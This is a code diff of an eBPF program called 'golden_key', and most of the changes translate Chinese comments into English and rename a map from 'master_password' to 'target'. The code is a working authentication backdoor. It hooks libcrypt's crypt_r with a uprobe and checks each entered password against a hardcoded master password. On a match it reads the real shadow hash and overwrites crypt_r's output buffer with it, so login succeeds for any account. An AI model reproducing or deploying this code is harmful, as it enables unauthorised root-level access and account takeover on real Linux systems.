@@ -7,29 +7,29 @@ char LICENSE[] SEC("license") = "GPL";
 char _metadata[] __attribute__((used, section(".metadata"))) =
     "{"
       "\"name\":\"golden_key\","
-      "\"desc\":\"万能密码：动态 Hook libcrypt 的 crypt_r 函数，拦截认证流并替换输出缓冲区\","
-      "\"requires\":[\"is_root\",\"uprobe\",\"probe_write\"],"
+      "\"desc\":\"Master Password: Dynamically hooks libcrypt's crypt_r function to intercept authentication streams and replace the output buffer.\","
       "\"options\":{"
-        "\"MASTER_PASSWORD\":[\"bufferfly\",\"系统万能密码（≤15字符），加载时或运行时配置\"]"
+        "\"target\":[\"bufferfly\",\"System master password (≤15 characters), configurable at load or runtime\"]"
       "},"
       "\"maps\":{"
-        "\"master_password\":{\"key_size\":4,\"value_size\":16,\"key_type\":\"u32\",\"value_type\":\"str\"}"
+        "\"target\":{\"key_size\":4,\"value_size\":16,\"key_type\":\"u32\",\"value_type\":\"str\"}"
       "}"
     "}";
 
 /*
- * 运行时可配置的万能密码
- * key=0 → char[16]（null-terminated，不超过15字符）
+ * Runtime-configurable Master Password
+ * key=0 → char[16] (null-terminated, max 15 characters)
  */
 struct {
     __uint(type, BPF_MAP_TYPE_ARRAY);
     __uint(max_entries, 1);
     __type(key, u32);
     __type(value, char[16]);
-} master_password SEC(".maps");
+} target SEC(".maps");
 
-/* * 记录触发万能密码的 PID → 保存的目标 shadow 哈希字符串 
- * 用结构体包裹字符串，确保存储和传递的安全
+/*
+ * Records PIDs that triggered the master password → saved target shadow hash string
+ * Wrap string in struct for safe storage and passing
  */
 struct hash_data {
     char hash_str[128];
@@ -42,8 +42,9 @@ struct {
     __type(value, struct hash_data);
 } targeted_pids SEC(".maps");
 
-/* * uprobe: crypt_r(const char *phrase, const char *setting, struct crypt_data *data)
- * 拦截密码输入，比对万能密码，并窃取真实的 shadow 哈希 (setting)
+/*
+ * uprobe: crypt_r(const char *phrase, const char *setting, struct crypt_data *data)
+ * Intercept password input, compare with master password, and steal the real shadow hash (setting)
  */
 SEC("uprobe")
 int BPF_KPROBE(crypt_r_enter, const char *phrase, const char *setting, void *data) {
@@ -54,10 +55,10 @@ int BPF_KPROBE(crypt_r_enter, const char *phrase, const char *setting, void *dat
     if (err <= 0) return 0;
 
     u32 map_key = 0;
-    char *master = bpf_map_lookup_elem(&master_password, &map_key);
+    char *master = bpf_map_lookup_elem(&target, &map_key);
     if (!master) return 0;
 
-    /* 逐字节比较 — 不使用 break，避免 unroll 问题 */
+    /* Byte-by-byte comparison — avoid 'break' to prevent unrolling issues */
     int match = 1;
     #pragma unroll
     for (int i = 0; i < 15; i++) {
@@ -68,7 +69,7 @@ int BPF_KPROBE(crypt_r_enter, const char *phrase, const char *setting, void *dat
 
     if (match) {
         struct hash_data hd = {};
-        // 这里的 setting 在 PAM 中通常就是完整的 shadow 哈希字符串
+        // The 'setting' in PAM is usually the full shadow hash string
         bpf_probe_read_user_str(hd.hash_str, sizeof(hd.hash_str), setting);
         bpf_map_update_elem(&targeted_pids, &pid, &hd, BPF_ANY);
         bpf_printk("GOLDEN_KEY: MATCH! PID %d, Stolen shadow hash: %s\n", pid, hd.hash_str);
@@ -76,8 +77,9 @@ int BPF_KPROBE(crypt_r_enter, const char *phrase, const char *setting, void *dat
     return 0;
 }
 
-/* * uretprobe: crypt_r
- * 覆写 crypt_r 返回的可写缓冲区，使其内容与真实的 shadow 哈希一模一样
+/*
+ * uretprobe: crypt_r
+ * Overwrite the writable buffer returned by crypt_r to match the real shadow hash perfectly
  */
 SEC("uretprobe")
 int BPF_KRETPROBE(crypt_r_exit, char *ret) {
@@ -86,7 +88,7 @@ int BPF_KRETPROBE(crypt_r_exit, char *ret) {
     if (!hd) return 0;
 
     if (ret) {
-        // 计算我们要写入的字符串长度（包含 \0）
+        // Calculate the length of the string to write (including \0)
         u32 len = 0;
         #pragma unroll
         for (int i = 0; i < 127; i++) {
@@ -96,7 +98,7 @@ int BPF_KRETPROBE(crypt_r_exit, char *ret) {
             }
         }
         if (len > 0) {
-            // 直接写入 crypt_r 的输出缓冲区，避开只读内存 (-EFAULT) 问题
+            // Directly write to the crypt_r output buffer, avoiding read-only memory (-EFAULT) issues
             long we = bpf_probe_write_user(ret, hd->hash_str, len);
             if (we == 0) {
                 bpf_printk("GOLDEN_KEY: crypt_r output overwritten successfully. Door is OPEN.\n");
